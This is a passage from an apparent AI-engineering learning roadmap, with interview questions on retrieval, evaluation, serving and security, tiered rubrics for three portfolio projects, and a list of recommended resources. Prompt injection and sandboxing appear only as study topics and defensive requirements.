4. **Bi-Encoder vs. Cross-Encoder Geometry:** Why does bi-encoder cosine similarity fail on negation queries like "companies not based in California", and how does full joint cross-attention in a reranker resolve the semantic ambiguity?
5. **Hybrid Search & Reciprocal Rank Fusion (RRF):** Why is directly summing normalized vector cosine scores and BM25 keyword scores an architectural mistake? What does the constant $k=60$ in $\frac{1}{k + \text{rank}}$ physically accomplish?
6. **Quantitative RAG Calipers:** Define Recall@k, Mean Reciprocal Rank (MRR), and Faithfulness mathematically. How do you compute them automatically in CI without relying on subjective human vibes?
7. **Curating the Golden Set:** How do you construct an unpolluted 40-question evaluation dataset with verified ground-truth chunk citations, and why do synthetic LLM-generated evaluation sets create dangerous blind spots?
8. **LLM-as-a-Judge Calibration:** What are position bias, verbosity bias, and self-enhancement bias in model evaluators, and what concrete prompting and scoring techniques neutralize them?
9. **Indirect Prompt Injection Vectors:** Trace the physical execution path of an indirect prompt injection payload hidden inside a customer invoice PDF. How does it hijack an autonomous agent with tool execution privileges?
10. **Ironclad Tool Sandboxing:** If an LLM emits a generated SQL query or shell command, how do you mathematically guarantee it cannot execute a destructive write or escape its execution sandbox?
11. **Deterministic State Machines vs. Autonomous ReAct Loops:** When is an unconstrained ReAct agent loop an architectural anti-pattern? What are the exact criteria for replacing an autonomous agent with a deterministic state graph?
12. **Model Context Protocol (MCP) Architecture:** What physical problem does the Model Context Protocol solve over custom REST tool schemas, and how does its JSON-RPC transport operate over stdio and SSE?
13. **The Millisecond Waterfall:** Break down the end-to-end p95 latency budget of a hybrid RAG query: embedding generation (45ms), vector distance traversal (15ms), BM25 scoring (10ms), RRF merging (2ms), cross-encoder reranking (40ms), and Time-To-First-Token (TTFT).
14. **Token Economics & Prompt Caching:** How does prompt prefix caching physically operate in GPU memory, and how do you structure prompt templates to maximize cache hits and cut token spend by 80%?
15. **Handling Structured Output Violations:** What is the physical difference between regex/JSON-schema logit masking at generation time versus self-repair retry loops when enforcing Pydantic models?
16. **Distributed Tracing & PII Scrubbing:** What exact metadata must be captured in an end-to-end LLM trace (spans, tokens, latencies, costs), and how do you prevent customer PII or authentication keys from leaking into trace databases?
17. **Empirical Failure Clustering:** How do you perform forensic error analysis on 100 failed production traces to categorize retrieval misses, context dilution, schema invalidations, and hallucinations?
18. **Continuous Evaluation Flywheels:** How do you harvest production user thumbs-down events and convert them into automated regression test fixtures in GitHub Actions CI?
19. **Quantization Arithmetic & VRAM Budgeting:** Calculate the exact GPU VRAM required to host a 70-billion parameter model in 4-bit quantization with an 8,192-token KV cache. How does 4-bit AWQ compare to 16-bit FP16 in perplexity?
20. **Self-Hosted vLLM vs. Proprietary APIs:** At what exact queries-per-second (QPS) threshold and data sensitivity level does spinning up dedicated GPUs with vLLM become cheaper and safer than paying OpenAI or Anthropic per token?
21. **PagedAttention & KV-Cache Fragmentation:** What physical memory bottleneck does vLLM's PagedAttention solve during concurrent multi-user serving, and how does it mimic operating system virtual memory paging?
22. **LoRA Mechanics & Hyperparameter Selection:** Why does Low-Rank Adaptation freeze base model weights and train decomposed low-rank matrices $W = W_0 + B \cdot A$? What physical trade-off governs your choice of rank $r$ and scaling factor $\alpha$?
23. **Multi-Tenant Vector Isolation:** Why is filtering search results by tenant permissions after vector retrieval a critical security flaw, and how do you enforce hard pre-filtering during index graph traversal?
24. **The 2 AM Production Outage Playbook:** When your primary model provider experiences a complete outage or severe rate-limiting storm, how does your infrastructure failover automatically without dropping active user streams?
25. **The Senior Decision Bar:** How do you prove to an executive leadership team that an AI feature is ready for production deployment using quantitative evaluation metrics, latency guarantees, and cost ceilings instead of subjective demos?

---

## 5. The Milestone Portfolio Bar (3 Production Systems with Tiered Rubrics)

To get hired as a high-earning AI engineer, certificates are completely worthless. Hiring managers are flooded with candidates who copied a toy script from a YouTube tutorial. You need running, public, observable systems that prove you understand the physical machine.

Use the **Tiered Mastery Rubric** to evaluate your systems:
- **Bronze (Junior Baseline):** Works cleanly on the happy path; typed Python, Pydantic schemas, and readable documentation.
- **Silver (Production-Ready):** Resilient under adverse conditions; handles 429 backoff with jitter, validates boundary schemas, logs TTFT latency, and passes automated unit/integration test suites.
- **Gold (Senior Signal):** Hardened against security attacks; full distributed tracing (Langfuse), CI regression gates with quantitative thresholds, automated failover, and a deep-dive architectural trade-off write-up with real numbers.

---

### Project 1 (End of Month 1): Structured Extraction & Streaming Microservice
*A high-throughput asynchronous API service extracting typed data from chaotic, unstructured text with real-time SSE streaming.*

| Tier | Requirements |
|---|---|
| **Bronze** | FastAPI endpoint accepting raw text and returning a valid Pydantic JSON schema on happy-path inputs; automated OpenAPI docs at `/docs`; clean README. |
| **Silver** | Server-Sent Events (SSE) token streaming with sub-400ms TTFT logging; automated 2-turn self-repair loops recovering from malformed JSON; handles 429 backoff with jitter; 95%+ first-pass extraction accuracy on `datasets/messy_invoices.json`. |
| **Gold** | Dockerized multi-stage container (<150MB) deployed live on cloud metal; BudgetGuard $2 hard session spend ceiling; comprehensive `pytest` suite with mocked provider responses; README featuring p50/p95 latency tables and cost-per-request calculations to $0.0001 precision. |

---

### Project 2 (End of Month 2): Enterprise Knowledge Assistant with CI Evals & MCP
*A domain-specific RAG platform with hybrid search (BM25 + dense), cross-encoder reranking, verifiable source citations, MCP server integration, and CI regression gates.*

| Tier | Requirements |
|---|---|
| **Bronze** | Vector search using pgvector or Qdrant with structural document chunking and LLM response generation over retrieved chunks. |
| **Silver** | Dual-radar hybrid search combining BM25 and dense embeddings via Reciprocal Rank Fusion (RRF, $k=60$); cross-encoder reranking stage; clickable inline source citations linking claims to chunk IDs; multi-tenant metadata pre-filtering. |
| **Gold** | Standard Model Context Protocol (MCP) server running over stdio/SSE exposing tools and document resources to desktop agents; automated evaluation harness (`python3 eval.py`) proving Recall@5 > 90% and MRR > 0.80 on a 40-question golden set; GitHub Actions CI workflow failing PRs on >1.5% recall regression; README opening with a quantitative before-and-after evaluation scorecard. |

---

### Project 3 (End of Month 3 - Capstone): Multi-Tenant Production AI Platform
*An end-to-end production AI system incorporating compound AI workflows, distributed observability, open model failover cascades, indirect injection defense, and an emergency outage playbook.*

| Tier | Requirements |
|---|---|
| **Bronze** | Full-stack application (Streamlit or Next.js UI + FastAPI backend); multi-step task execution with tools; deployed live on public infrastructure. |
| **Silver** | Compound AI architecture (Router + Evaluator-Optimizer state machine); Langfuse distributed tracing capturing every token, span, and dollar; XML boundary fences and AST sandboxes neutralizing indirect prompt injection; cryptographic human-in-the-loop approval gates for destructive actions. |
| **Gold** | Sustained load testing with Locust/k6 proving 99%+ success rate and p95 latency < 2.5s under 20 concurrent users; automatic failover to local vLLM/Ollama open model during provider blackouts; comprehensive **Production Failure Playbook (`PLAYBOOK.md`)** detailing step-by-step triage for 5 outage scenarios; published **Deep-Dive Architectural Write-up** analyzing engineering trade-offs, token economics, and empirical evaluation progressions. |

---

## 6. Curated High-Signal Resource List (One per Category)

- **Book:** *AI Engineering* — Chip Huyen (O'Reilly). The definitive comprehensive guide for the role.
- **Evals & Error Analysis:** Hamel Husain (`hamel.dev`). Master his evaluation and error-labeling methodologies.
- **Field Awareness:** Simon Willison (`simonwillison.net`). Essential weekly insights on prompt injection, open models, and tooling.
- **Retrieval Quality:** Ragas Documentation (`docs.ragas.io`) and Cohere Rerank guides.
- **Protocols & Standards:** Model Context Protocol Specification (`modelcontextprotocol.io`).
- **Tracing & Telemetry:** Langfuse Documentation (`langfuse.com/docs`).
- **Open Model Serving:** vLLM Documentation (`docs.vllm.ai`).
